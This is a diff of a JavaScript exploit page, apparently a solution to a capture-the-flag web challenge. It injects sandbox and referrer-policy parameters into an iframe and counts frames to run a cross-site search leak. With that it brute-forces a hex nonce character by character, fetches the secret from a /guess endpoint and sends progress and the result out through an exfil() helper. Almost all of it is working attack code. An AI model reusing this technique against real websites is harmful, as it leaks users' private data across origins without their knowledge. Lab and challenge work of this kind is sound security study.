@@ -15,71 +15,82 @@ function testOne(prefix) {
         document.getElementById('f').appendChild(v);
         let done = false;
         function fin(r) { if(done) return; done = true; try{v.remove();}catch(e){} resolve(r); }
-        const to = setTimeout(() => fin(false), 12000);
+        const to = setTimeout(() => fin(false), 14000);
 
         v.onload = () => {
+            // Wait for pageshow + JS to create iframes
             setTimeout(() => {
                 let t = 0;
                 try { t = v.contentWindow.length; } catch(e) { clearTimeout(to); fin(false); return; }
-                if (t === 0) { setTimeout(() => {
-                    try { t = v.contentWindow.length; } catch(e) {}
-                    if (t === 0) { clearTimeout(to); fin(false); return; }
-                    go(t);
-                }, 800); } else go(t);
+                if (t === 0) {
+                    // Retry once more
+                    setTimeout(() => {
+                        try { t = v.contentWindow.length; } catch(e) {}
+                        if (t === 0) { clearTimeout(to); fin(false); return; }
+                        go(t);
+                    }, 1000);
+                } else go(t);
 
                 function go(total) {
+                    // Navigate all sub-frames to about:blank
                     for (let i = 0; i < total; i++) {
                         try { v.contentWindow.frames[i].location = 'about:blank'; } catch(e) {}
                     }
+                    // Wait longer for about:blank to settle in ALL frames
                     setTimeout(() => {
                         let blk = 0;
                         for (let i = 0; i < total; i++) {
                             try { v.contentWindow.frames[i].document; } catch(e) { blk++; }
                         }
                         clearTimeout(to);
-                        fin(blk > 0);
-                    }, 500);
+                        // Only count as match if blk is 1-3 (expected note count)
+                        // blk > 3 is likely false positives from slow-loading frames
+                        fin(blk >= 1 && blk <= 3);
+                    }, 1500);
                 }
-            }, 300);
+            }, 500);
         };
         v.src = CHALL + '/?sandbox=x&referrerPolicy=allow-scripts%20allow-same-origin&search=' + encodeURIComponent(prefix);
     });
 }
 
-// Race: launch all 16, resolve as soon as first match found
-function findChar(nonce) {
-    return new Promise(resolve => {
-        let found = false;
-        let done = 0;
-        HEX.split('').forEach(c => {
-            testOne(nonce + c).then(match => {
-                if (match && !found) { found = true; resolve(c); }
-                done++;
-                if (done === 16 && !found) resolve(null);
-            });
-        });
-    });
+async function findChar(nonce, pos) {
+    // Wait for ALL 16 to complete - no racing
+    const results = await Promise.all(
+        HEX.split('').map(c => testOne(nonce + c).then(m => ({char: c, match: m})))
+    );
+    const hits = results.filter(r => r.match);
+    if (hits.length === 1) return hits[0].char;
+    if (hits.length > 1) {
+        exfil('multi_p' + pos + '_' + hits.map(h=>h.char).join(''));
+        // Verify each match one by one
+        for (const h of hits) {
+            const ok = await testOne(nonce + h.char);
+            if (ok) return h.char;
+        }
+    }
+    return null;
 }
 
 (async () => {
     exfil('go');
     let nonce = '';
     for (let p = 0; p < 8; p++) {
-        const c = await findChar(nonce);
+        const c = await findChar(nonce, p);
         if (c) {
             nonce += c;
             exfil('p' + p + '=' + c + '_' + nonce);
         } else {
             exfil('miss' + p);
             p--;
-            await new Promise(r => setTimeout(r, 500));
+            await new Promise(r => setTimeout(r, 300));
         }
     }
     exfil('n=' + nonce);
     try {
         const r = await fetch(CHALL + '/guess?nonce=' + nonce);
         const t = await r.text();
-        exfil('flag=' + t);
-    } catch(e) { exfil('err=' + e.message.substring(0,40)); }
+        exfil('R=' + t);
+    } catch(e) { exfil('E=' + e.message.substring(0,40)); }
 })();
 </script></body></html>
